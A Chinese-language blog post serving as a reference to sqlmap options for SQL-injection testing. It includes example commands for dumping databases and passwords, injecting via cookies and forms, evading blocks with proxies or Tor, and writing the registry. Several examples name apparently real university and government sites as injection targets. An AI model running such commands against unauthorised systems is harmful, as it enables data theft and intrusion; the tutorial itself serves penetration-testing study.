<!DOCTYPE html><html lang="zh-CN "><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hongxiaodou || sqlmap</title>
    <meta name="author" content="hongxiaodou">
    <meta name="description" content="林深不见鹿，山巅自相逢 ">
    <meta name="keywords" content=" ">
    <link rel="icon" href="/images/1.png">
    <link rel="stylesheet" href="/css/antd.min.css">
    
    <link rel="stylesheet" href="/css/full-theme.css">
    
    <script src="/js/vue.js"></script>
    <script src="/js/antd.min.js"></script>
<!-- hexo injector head_end start --><style>
.body hanla:after {
    content: ' ';
    display: inline;
    font-family: Arial;
    font-size: 0.89em;
}

html code hanla,
html pre hanla,
html kbd hanla,
html samp hanla {
    display: none;
}

html ol > hanla,
html ul > hanla {
    display: none;
}
</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>

<body>

    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                <div>
                    <h2>LOADING...</h2>
                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
                    <div>
                        <img src="/dancingkitty.gif" alt="loading">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="layout">
        <transition name="into">
            <div v-show="show_page" style="display: none;">
                <div id="menu_show">
                     
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Hongxiaodou</span>
        </a>
        
        <a href="/">
            <span>
                <a-icon type="home" theme="filled">
            </a-icon></span>
            <span><hanla></hanla>主页</span>
        </a>
        
    </div>

    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div :class="'title'" @click="menu_show=!menu_show">
            <span style="margin-right: 10px;">
                <a-icon type="appstore" theme="filled">
            </a-icon></span>
            <span><hanla></hanla>Hongxiaodou</span>
        </div>
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="home" theme="filled">
                    </a-icon></div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
                </div>
            </a>
            
        </div>
        <div class="curtain" v-show="menu_show"></div>
    </div>

</nav>
                </div>

                <div id="main">
                     
<link rel="stylesheet" href="/css/post-body.css">
<div class="article">
    <div>
        <h1>sqlmap </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled">
            </a-icon></span>
            2021/9/27
        </span>

        
        <span class="category">
            <a href="/categories/工具使用篇">
                <span class="icon">
                    <a-icon type="book" theme="filled">
                </a-icon></span>
                工具使用篇
            </a>
        </span>
        

        
    </div>

    <div class="content" v-pre="">
        <p>补充：<br>sqlmap</p>
<span id="more"></span>

<p><hanla></hanla>mysql root 在<hanla></hanla>windows 权限很高<br><hanla></hanla>而在<hanla></hanla>linux 只是服务用户权限<br><hanla></hanla>postgresql postgres 具有写入根目录权限</p>
<p>sqlmap.org<br>user - agent : –random-agent </p>
<h2 id="sqlmap介绍与常规操作"><a href="#sqlmap介绍与常规操作" class="headerlink" title="sqlmap介绍与常规操作"></a><hanla></hanla>sqlmap<hanla></hanla>介绍与常规操作</h2><p><hanla></hanla>sqlmap 是一个由<hanla></hanla>Python<hanla></hanla>语言编写的开源渗透测试工具，它主要用来检测<hanla></hanla>sql<hanla></hanla>注入漏洞，  是一款功能强大的<hanla></hanla>sql<hanla></hanla>漏洞检测利用工具。  </p>
<p><hanla></hanla>它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite<hanla></hanla>等<br><hanla></hanla>可以进行 sql<hanla></hanla>盲注、union<hanla></hanla>查询、显错注入、延迟注入、post<hanla></hanla>注入、cookie<hanla></hanla>注入等<br>其他功能:<br><hanla></hanla>执行命令、列举用户、检测权限、自动破解、数据导出等功能。</p>
<p>下载地址：<br><a target="_blank" rel="noopener" href="http://www.sqlmap.org/">http://www.sqlmap.org</a><br><hanla></hanla>安装<br><hanla></hanla>首先需要安装<hanla></hanla>python2.7 环境  </p>
<p>直接解压即可<br>更新<br><hanla></hanla>sqlmap.py –update   </p>
<h2 id="sqlmap基本参数"><a href="#sqlmap基本参数" class="headerlink" title="sqlmap基本参数"></a><hanla></hanla>sqlmap<hanla></hanla>基本参数</h2><p><hanla></hanla>Sqlmap.py  -h         查看帮助选项<br><hanla></hanla>is-dba            当前用户权限<br><hanla></hanla>dbs                所有数据库<br><hanla></hanla>current-db        网站当前数据库<br><hanla></hanla>users            所有数据库用户<br><hanla></hanla>current-user        当前数据库用户<br><hanla></hanla>tables            参数:<hanla></hanla>列表名<br><hanla></hanla>columns            参数:<hanla></hanla>列字段<br><hanla></hanla>dump            参数:<hanla></hanla>下载数据  </p>
<p>–dump             获取表中的数据，包含列<br><hanla></hanla>–dump-all        转存<hanla></hanla>DBMS<hanla></hanla>数据库所有表项目<br><hanla></hanla>–level            测试等级<hanla></hanla>(1-5)，默认为<hanla></hanla>1<br><hanla></hanla>读取数据库—&gt;<hanla></hanla>读取表—-&gt;<hanla></hanla>读取表的列—-&gt;<hanla></hanla>获取内容  </p>
<p>-D              指定数据库<br>-T            指定表<br>-C            指定列<br>–dbms=mysql  oracle mssql         指定数据库  </p>
<p>–users    枚举所有用户<br>–passwords    枚举所有用户密码<br>–roles    列出数据库管理员角色<br>–privileges     列出数据库管理员权限  </p>
<p>列举数据库系统的架构<br><hanla></hanla>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://xx.com/int.php?id=1&quot;">http://xx.com/int.php?id=1"</a> –schema –batch   –exclude-sysdbs  </p>
<h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><p>参数： –level<br><hanla></hanla>共有五个等级，默认为<hanla></hanla>1，sqlmap<hanla></hanla>使用的<hanla></hanla>payload<hanla></hanla>可以在<hanla></hanla>xml/payloads.xml<hanla></hanla>中看到，你也可以根据相应的格式添加自己的<hanla></hanla>payload。<br><hanla></hanla>这个参数不仅影响使用哪些<hanla></hanla>payload<hanla></hanla>同时也会影响测试的注入点，<br><hanla></hanla>GET<hanla></hanla>和<hanla></hanla>POST<hanla></hanla>的数据都会测试，HTTP Cookie<hanla></hanla>在<hanla></hanla>level<hanla></hanla>为<hanla></hanla>2<hanla></hanla>的时候就会测试，<br><hanla></hanla>HTTP User-Agent/Referer<hanla></hanla>头在<hanla></hanla>level<hanla></hanla>为<hanla></hanla>3<hanla></hanla>的时候就会测试。<br><hanla></hanla>总之在你不确定哪个<hanla></hanla>payload<hanla></hanla>或者参数为注入点的时候，<br><hanla></hanla>为了保证全面性，建议使用高的<hanla></hanla>level<hanla></hanla>值。</p>
<h3 id="显示调试信息"><a href="#显示调试信息" class="headerlink" title="显示调试信息"></a>显示调试信息</h3><p><hanla></hanla>-v  显示调试信息 有<hanla></hanla>7<hanla></hanla>个级别  </p>
<p><hanla></hanla>0、只显示<hanla></hanla>python<hanla></hanla>错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认）<br><hanla></hanla>2、同时显示<hanla></hanla>debug<hanla></hanla>信息。<br><hanla></hanla>3、同时显示注入的<hanla></hanla>payload。<br><hanla></hanla>4、同时显示<hanla></hanla>HTTP<hanla></hanla>请求。<br><hanla></hanla>5、同时显示<hanla></hanla>HTTP<hanla></hanla>响应头。<br><hanla></hanla>6、同时显示<hanla></hanla>HTTP<hanla></hanla>响应页面。  </p>
<h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3><p>参数：–risk</p>
<p><hanla></hanla>共有四个风险等级，默认是<hanla></hanla>1<hanla></hanla>会测试大部分的测试语句，2<hanla></hanla>会增加基于事件的测试语句，3<hanla></hanla>会增加<hanla></hanla>OR<hanla></hanla>语句的<hanla></hanla>SQL<hanla></hanla>注入测试。</p>
<p><hanla></hanla>在有些时候，例如在<hanla></hanla>UPDATE<hanla></hanla>的语句中，注入一个<hanla></hanla>OR<hanla></hanla>的测试语句，可能导致更新的整个表，<br>可能造成很大的风险。</p>
<p><hanla></hanla>测试的语句同样可以在<hanla></hanla>xml/payloads.xml<hanla></hanla>中找到，你也可以自行添加<hanla></hanla>payload。</p>
<h2 id="sqlmap获取目标"><a href="#sqlmap获取目标" class="headerlink" title="sqlmap获取目标"></a><hanla></hanla>sqlmap<hanla></hanla>获取目标</h2><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><p><hanla></hanla>-u<hanla></hanla>或者–url<br><hanla></hanla>格式：http(s)://targeturl[:port]/[…]<br><hanla></hanla>例如：python sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.target.com/vuln.php?id=1">http://www.target.com/vuln.php?id=1</a></p>
<p><hanla></hanla>参数：-u<hanla></hanla>或者–url<br><hanla></hanla>格式：http(s)://targeturl[:port]/[…]<br><hanla></hanla>例如：python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.target.com/vuln.php?id=1&quot;">http://www.target.com/vuln.php?id=1"</a></p>
<h3 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h3><p>参数：<br>-m<br><hanla></hanla>文件中保存<hanla></hanla>url<hanla></hanla>格式如下，sqlmap<hanla></hanla>会一个一个检测<br><a target="_blank" rel="noopener" href="http://www.target1.com/vuln1.php?q=foobar"><hanla></hanla>www.target1.com/vuln1.php?q=foobar</a><br><a target="_blank" rel="noopener" href="http://www.target2.com/vuln2.asp?id=1">www.target2.com/vuln2.asp?id=1</a><br><a target="_blank" rel="noopener" href="http://www.target3.com/vuln3/id/1">www.target3.com/vuln3/id/1</a>*  </p>
<p>sqlmap.py -m c:\x.txt –batch –smart –level 3 –risk 3   –random-agent –tamper=space2ment.py<br>–batch 自动回车  </p>
<h3 id="获取http请求注入"><a href="#获取http请求注入" class="headerlink" title="获取http请求注入"></a><hanla></hanla>获取<hanla></hanla>http<hanla></hanla>请求注入</h3><p>参数：-r<br><hanla></hanla>sqlmap<hanla></hanla>可以从一个文本文件中获取<hanla></hanla>HTTP<hanla></hanla>请求，这样就可以跳过设置一些其他参数（比如  cookie，POST<hanla></hanla>数据，等等）。  </p>
<p>比如文本文件内如下：  </p>
<p>POST /vuln.php HTTP/1.1<br>Host: <a target="_blank" rel="noopener" href="http://www.target.com/">www.target.com</a><br>User-Agent: Mozilla/4.0<br>id=1  </p>
<h3 id="处理Google搜索结果"><a href="#处理Google搜索结果" class="headerlink" title="处理Google搜索结果"></a><hanla></hanla>处理<hanla></hanla>Google<hanla></hanla>搜索结果</h3><p>参数： -g<br><hanla></hanla>sqlmap<hanla></hanla>可以测试注入<hanla></hanla>google<hanla></hanla>的搜索结果中的<hanla></hanla>GET<hanla></hanla>参数（只获取前<hanla></hanla>100<hanla></hanla>个结果）<br>例子：<br>python sqlmap.py -g “inurl:php?id=”  </p>
<h3 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h3><p><hanla></hanla>此参数是把数据以<hanla></hanla>POST<hanla></hanla>方式提交，sqlmap<hanla></hanla>会像检测<hanla></hanla>GET<hanla></hanla>参数一样检测<hanla></hanla>POST<hanla></hanla>的参数。  </p>
<p>例子：  </p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.cracer.com/cracer.php%E2%80%9D">http://www.cracer.com/cracer.php”</a> –data=“id=1”</p>
<h3 id="–param-del"><a href="#–param-del" class="headerlink" title="–param-del"></a>–param-del</h3><p><hanla></hanla>参数拆分字符   </p>
<p><hanla></hanla>当<hanla></hanla>GET<hanla></hanla>或<hanla></hanla>POST<hanla></hanla>的数据需要用其他字符分割测试参数的时候需要用到此参数。  </p>
<p>例子：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.cracer.com/vuln.php&quot;">http://www.cracer.com/vuln.php"</a>   –data=”query=foobar;d=1” –param-del=”;”<br><hanla></hanla>sqlmap<hanla></hanla>默认只识别<hanla></hanla>&amp; 比如<hanla></hanla>id=123&amp;ld=ka  </p>
<h3 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h3><p><hanla></hanla>适用于<hanla></hanla>cookie<hanla></hanla>注入  </p>
<p><hanla></hanla>将参加加入<hanla></hanla>cookie<hanla></hanla>注入测试<br><hanla></hanla>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.ntjx.org/jsj/DownloadShow.asp&quot;">http://www.ntjx.org/jsj/DownloadShow.asp"</a> –cookie “id=9”   –table –level 2 </p>
<h3 id="–referer-–headers-–proxy"><a href="#–referer-–headers-–proxy" class="headerlink" title="–referer,–headers.–proxy"></a>–referer,–headers.–proxy</h3><p>–referer<br><hanla></hanla>sqlmap<hanla></hanla>可以在请求中伪造<hanla></hanla>HTTP<hanla></hanla>中的<hanla></hanla>referer，<br><hanla></hanla>当–level<hanla></hanla>参数设定为<hanla></hanla>3<hanla></hanla>或者<hanla></hanla>3<hanla></hanla>以上的时候会尝试对<hanla></hanla>referer<hanla></hanla>注入。  </p>
<p>–headers<br><hanla></hanla>可以通过–headers<hanla></hanla>参数来增加额外的<hanla></hanla>http<hanla></hanla>头<br>–hearders “client-ip: 1.1.1.1’”  </p>
<p>–proxy<br><hanla></hanla>使用–proxy<hanla></hanla>代理是格式为：<a href="http://url:port。">http://url:port。</a><br>–proxy=<a target="_blank" rel="noopener" href="http://127.0.0.1:1080/">http://127.0.0.1:1080</a><br>–proxy-file c:/1.txt 读取文件列表中的代理<br><hanla></hanla>xici<hanla></hanla>代理，西瓜代理,<hanla></hanla>可以自己抓取，或者买一个一个请求换一个<hanla></hanla>ip  </p>
<p>–tor  –proxy-type=”socks5”  </p>
<h3 id="时间控制"><a href="#时间控制" class="headerlink" title="时间控制"></a>时间控制</h3><p>–delay<br><hanla></hanla>可以设定两个<hanla></hanla>HTTP(S)<hanla></hanla>请求间的延迟，设定为<hanla></hanla>0.5<hanla></hanla>的时候是半秒，默认是没有延迟的。  </p>
<p>–timeout<br><hanla></hanla>可以设定一个<hanla></hanla>HTTP(S)<hanla></hanla>请求超过多久判定为超时，10.5<hanla></hanla>表示<hanla></hanla>10.5<hanla></hanla>秒，默认是<hanla></hanla>30<hanla></hanla>秒。<br>设定重试超时<br>–retries  </p>
<p><hanla></hanla>当<hanla></hanla>HTTP(S)<hanla></hanla>超时时，可以设定重新尝试连接次数，默认是<hanla></hanla>3<hanla></hanla>次。<br>设定随机改变的参数值  </p>
<h3 id="–safe-url-–safe-freq"><a href="#–safe-url-–safe-freq" class="headerlink" title="–safe-url,–safe-freq"></a>–safe-url,–safe-freq</h3><p><hanla></hanla>有的<hanla></hanla>web<hanla></hanla>应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，<br><hanla></hanla>这样在<hanla></hanla>sqlmap<hanla></hanla>进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。  </p>
<p>绕过这个策略有两种方式：  </p>
<p>1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>2、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全 连接</p>
<h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><p><hanla></hanla>sqlmap<hanla></hanla>默认测试所有的<hanla></hanla>get<hanla></hanla>和<hanla></hanla>post<hanla></hanla>参数，当–level<hanla></hanla>的值大于等于<hanla></hanla>2<hanla></hanla>的时候也会测试<hanla></hanla>HTTP Cookie<hanla></hanla>头的值，<br><hanla></hanla>当大于等于<hanla></hanla>3<hanla></hanla>的时候也会测试<hanla></hanla>User-Agent<hanla></hanla>和<hanla></hanla>HTTP Referer<hanla></hanla>头的值。<br>但是你可以手动用-p  </p>
<p>参数设置想要测试的参数。例如： -p “id,user-anget”  </p>
<h3 id="–prefix-–suffix"><a href="#–prefix-–suffix" class="headerlink" title="–prefix,–suffix"></a>–prefix,–suffix</h3><p><hanla></hanla>有些环境中，需要在注入的<hanla></hanla>payload<hanla></hanla>的前面或者后面加一些字符，来保证<hanla></hanla>payload<hanla></hanla>的正常执行。  </p>
<p>例如，代码中是这样调用数据库的：</p>
<pre><code><hanla></hanla>$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 
这时你就需要--prefix<hanla></hanla>和--suffix<hanla></hanla>参数了：
python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
这样执行的<hanla></hanla>SQL<hanla></hanla>语句变成：
$query = "SELECT * FROM users WHERE id=(’1’) <payload> AND (’abc’=’abc’) LIMIT 0, 1"; 
</payload></code></pre>
<h3 id="–technique"><a href="#–technique" class="headerlink" title="–technique"></a>–technique</h3><p><hanla></hanla>这个参数可以指定<hanla></hanla>sqlmap<hanla></hanla>使用的探测技术，默认情况下会测试所有的方式。  </p>
<p>支持的探测方式如下：  </p>
<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）  </p>
<h3 id="–union-cols"><a href="#–union-cols" class="headerlink" title="–union-cols"></a>–union-cols</h3><p><hanla></hanla>默认情况下<hanla></hanla>sqlmap<hanla></hanla>测试<hanla></hanla>UNION<hanla></hanla>查询注入会测试<hanla></hanla>1-10<hanla></hanla>个字段数，<br><hanla></hanla>当–level<hanla></hanla>为<hanla></hanla>5<hanla></hanla>的时候他会增加测试到<hanla></hanla>50<hanla></hanla>个字段数。设定–union-cols<hanla></hanla>的值应该是一段整数，<br><hanla></hanla>如：12-16，是测试<hanla></hanla>12-16<hanla></hanla>个字段数。  </p>
<h3 id="–union-char"><a href="#–union-char" class="headerlink" title="–union-char"></a>–union-char</h3><p><hanla></hanla>默认情况下<hanla></hanla>sqlmap<hanla></hanla>针对<hanla></hanla>UNION<hanla></hanla>查询的注入会使用<hanla></hanla>NULL<hanla></hanla>字符，但是有些情况下会造成页面返回失败，<br><hanla></hanla>而一个随机整数是成功的，这是你可以用–union-char<hanla></hanla>只定<hanla></hanla>UNION<hanla></hanla>查询的字符。<br><hanla></hanla>二阶<hanla></hanla>SQL<hanla></hanla>注入  </p>
<h3 id="–second-order"><a href="#–second-order" class="headerlink" title="–second-order"></a>–second-order</h3><p><hanla></hanla>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，<br><hanla></hanla>这时候就需要你指定到哪个页面获取响应判断真假。–second-order<hanla></hanla>后门跟一个判断页面的<hanla></hanla>URL<hanla></hanla>地址.  </p>
<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.baidu.com/x.php?id=1&quot;">http://www.baidu.com/x.php?id=1"</a> –second-order “<a target="_blank" rel="noopener" href="http://www.baidu,com/22.php&quot;">http://www.baidu,com/22.php"</a>  </p>
<h3 id="–dump-all-–exclude-sysdbs"><a href="#–dump-all-–exclude-sysdbs" class="headerlink" title="–dump-all,–exclude-sysdbs"></a>–dump-all,–exclude-sysdbs</h3><p><hanla></hanla>使用–dump-all<hanla></hanla>参数获取所有数据库表的内容，可同时加上<br><hanla></hanla>–exclude-sysdbs<hanla></hanla>只获取用户数据库的表，<br><hanla></hanla>需要注意在<hanla></hanla>Microsoft SQL Server<hanla></hanla>中<hanla></hanla>master<hanla></hanla>数据库没有考虑成为一个系统数据库，<br>因为  </p>
<p>有的管理员会把他当初用户数据库一样来使用它。  </p>
<h3 id="–search，-C，-T，-D"><a href="#–search，-C，-T，-D" class="headerlink" title="–search，-C，-T，-D"></a>–search，-C，-T，-D</h3><p><hanla></hanla>–search<hanla></hanla>可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。  </p>
<p>可以在一下三种情况下使用：   </p>
<p><hanla></hanla>-C<hanla></hanla>后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。<br><hanla></hanla>-T<hanla></hanla>后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名<br><hanla></hanla>-D<hanla></hanla>后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。   </p>
<h3 id="–udf-inject-–shared-lib"><a href="#–udf-inject-–shared-lib" class="headerlink" title="–udf-inject,–shared-lib"></a>–udf-inject,–shared-lib</h3><p><hanla></hanla>你可以通过编译<hanla></hanla>MySQL<hanla></hanla>注入你自定义的函数（UDFs）或<hanla></hanla>PostgreSQL<hanla></hanla>在<hanla></hanla>windows<hanla></hanla>中共享库，DLL，<br><hanla></hanla>或者<hanla></hanla>Linux/   Unix<hanla></hanla>中共享对象，sqlmap<hanla></hanla>将会问你一些问题，上传到服务器数据库自定义函数，<br>然后   </p>
<p><hanla></hanla>根据你的选择执行他们，当你注入完成后，sqlmap<hanla></hanla>将会移除它们。  </p>
<h3 id="s-t"><a href="#s-t" class="headerlink" title="-s,-t"></a>-s,-t</h3><p><hanla></hanla>参数：-s   </p>
<p><hanla></hanla>sqlmap<hanla></hanla>对每一个目标都会在<hanla></hanla>output<hanla></hanla>路径下自动生成一个<hanla></hanla>SQLite<hanla></hanla>文件，如果用户想指定读取的文件路径，就可以用这个参数。<br><hanla></hanla>保存<hanla></hanla>HTTP(S)<hanla></hanla>日志  </p>
<p>参数：  </p>
<h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p><hanla></hanla>这个参数需要跟一个文本文件，sqlmap<hanla></hanla>会把<hanla></hanla>HTTP(S)<hanla></hanla>请求与响应的日志保存到那里。  </p>
<h3 id="–batch"><a href="#–batch" class="headerlink" title="–batch"></a>–batch</h3><p>–batch</p>
<p><hanla></hanla>用此参数，不需要用户输入，将会使用<hanla></hanla>sqlmap<hanla></hanla>提示的默认值一直运行下去。</p>
<p>强制使用字符编码</p>
<h3 id="–charset"><a href="#–charset" class="headerlink" title="–charset"></a>–charset</h3><p><hanla></hanla>不使用<hanla></hanla>sqlmap<hanla></hanla>自动识别的（如<hanla></hanla>HTTP<hanla></hanla>头中的<hanla></hanla>Content-Type）字符编码，强制指定字符编码如：  </p>
<p>–charset=GBK  </p>
<p>–flush-session<br>–flush-session<br><hanla></hanla>如果不想用之前缓存这个目标的<hanla></hanla>session<hanla></hanla>文件，可以使用这个参数。   会清空之前的<hanla></hanla>session，重新测试该目标。<br><hanla></hanla>自动获取<hanla></hanla>form<hanla></hanla>表单测试  </p>
<h3 id="–hex"><a href="#–hex" class="headerlink" title="–hex"></a>–hex</h3><p><hanla></hanla>有时候字符编码的问题，可能导致数据丢失，可以使用<hanla></hanla>hex<hanla></hanla>函数来避免：<br>例子：</p>
<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot;">http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"</a> –banner –hex -v 3 –parse-errors  </p>
<h3 id="–output-dir"><a href="#–output-dir" class="headerlink" title="–output-dir"></a>–output-dir</h3><p>–output-dir</p>
<p><hanla></hanla>sqlmap<hanla></hanla>默认把<hanla></hanla>session<hanla></hanla>文件跟结果文件保存在<hanla></hanla>output<hanla></hanla>文件夹下，用此参数可自定义输出路径<br>例如：–output-dir=/tmp<br><hanla></hanla>从响应中获取<hanla></hanla>DBMS<hanla></hanla>的错误信息   </p>
<p>参数：</p>
<h3 id="–parse-errors"><a href="#–parse-errors" class="headerlink" title="–parse-errors"></a>–parse-errors</h3><p><hanla></hanla>有时目标没有关闭<hanla></hanla>DBMS<hanla></hanla>的报错，当数据库语句错误时，<br>会输出错误语句，用词参数可以会显出错误信息。   </p>
<h3 id="–smart-–mobile"><a href="#–smart-–mobile" class="headerlink" title="–smart,–mobile"></a>–smart,–mobile</h3><p>–smart<br><hanla></hanla>有时对目标非常多的<hanla></hanla>URL<hanla></hanla>进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，<br>可以使用此参数。<br>例子：<br>$ python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;">http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1"</a> –batch –smart  </p>
<h3 id="–mobile"><a href="#–mobile" class="headerlink" title="–mobile"></a>–mobile</h3><p><hanla></hanla>有时服务端只接收移动端的访问，此时可以设定一个手机的<hanla></hanla>User-Agent<hanla></hanla>来模仿手机登陆。<br>例如：<br>$ python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.target.com/vuln.php?id=1&quot;">http://www.target.com/vuln.php?id=1"</a> –mobile</p>
<h2 id="sqlmap常用操作"><a href="#sqlmap常用操作" class="headerlink" title="sqlmap常用操作"></a><hanla></hanla>sqlmap<hanla></hanla>常用操作</h2><h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><p><hanla></hanla>当数据库为<hanla></hanla>MySQL，PostgreSQL<hanla></hanla>或<hanla></hanla>Microsoft SQL   Server，并且当前<hanla></hanla>web<hanla></hanla>应用支持堆查询。<br>当然，当前连接数据库的用户也需要有权限操作注册表。<br>读取注册表值<br>参数：–reg-read<br><hanla></hanla>写入注册表值<br>参数：–reg-add<br><hanla></hanla>删除注册表值<br>参数：–reg-de<br><hanla></hanla>注册表辅助选项<br>参数：–reg-key，–reg-value，–reg-data，–reg-type<br><hanla></hanla>需要配合之前三个参数使用，<br>例子：<br>$ python sqlmap.py -u <a target="_blank" rel="noopener" href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> –reg-add<br>–reg-key=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test –reg-<br>type=REG_SZ –reg-data=1</p>
<h3 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h3><p>参数：–common-tables<br><hanla></hanla>当使用–tables<hanla></hanla>无法获取到数据库的表时，可以使用此参数。<br>通常是如下情况：<br><hanla></hanla>1、MySQL<hanla></hanla>数据库版本小于<hanla></hanla>5.0，没有<hanla></hanla>information_schema<hanla></hanla>表。<br><hanla></hanla>2、数据库是<hanla></hanla>Microssoft Access，系统表<hanla></hanla>MSysObjects<hanla></hanla>是不可读的（默认）。<br>3、当前用户没有权限读取系统中保存数据结构的表的权限。<br><hanla></hanla>暴力破解的表在<hanla></hanla>txt/common-tables.txt<hanla></hanla>文件中<br>，你可以自己添加。  </p>
<p>Xx  –common-tables -D testdb   </p>
<p>暴力破解列名<br>参数：–common-columns<br><hanla></hanla>与暴力破解表名一样，<br>暴力跑的列名在<br><hanla></hanla>txt/common-columns.txt<hanla></hanla>中。  </p>
<p>Xx  –common-columns  -T text -D testdb  </p>
<h3 id="POST登录框注入"><a href="#POST登录框注入" class="headerlink" title="POST登录框注入"></a><hanla></hanla>POST<hanla></hanla>登录框注入</h3><p>注入点：<a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a><br><hanla></hanla>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass    </p>
<p>sqlmap -u <a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a> –forms  </p>
<p>sqlmap -u <a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a> –data “tfUName=1&amp;tfUPass=1”</p>
<h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p><hanla></hanla>sqlmap.py -r search-test.txt  </p>
<h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>注入点：<br><a target="_blank" rel="noopener" href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html">http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html</a><br>sqlmap -u <a target="_blank" rel="noopener" href="http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.htm">http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.htm</a></p>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a><hanla></hanla>base64<hanla></hanla>编码</h3><p><hanla></hanla>sqlmap -u <a target="_blank" rel="noopener" href="http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5">http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5</a> –tamper base64encode.py –dbs<br><a target="_blank" rel="noopener" href="http://lm.yichang.gov.cn/">http://lm.yichang.gov.cn/</a></p>
<h3 id="请求时间延迟"><a href="#请求时间延迟" class="headerlink" title="请求时间延迟"></a>请求时间延迟</h3><p>参数：<br>–time-sec<br><hanla></hanla>当使用继续时间的盲注时，时刻使用–time-sec<hanla></hanla>参数设定延时时间，默认是<hanla></hanla>5<hanla></hanla>秒</p>
<p><hanla></hanla>执行<hanla></hanla>sql<hanla></hanla>语句<br>–sql-query=”select @@version”<br>–sql-shell  </p>
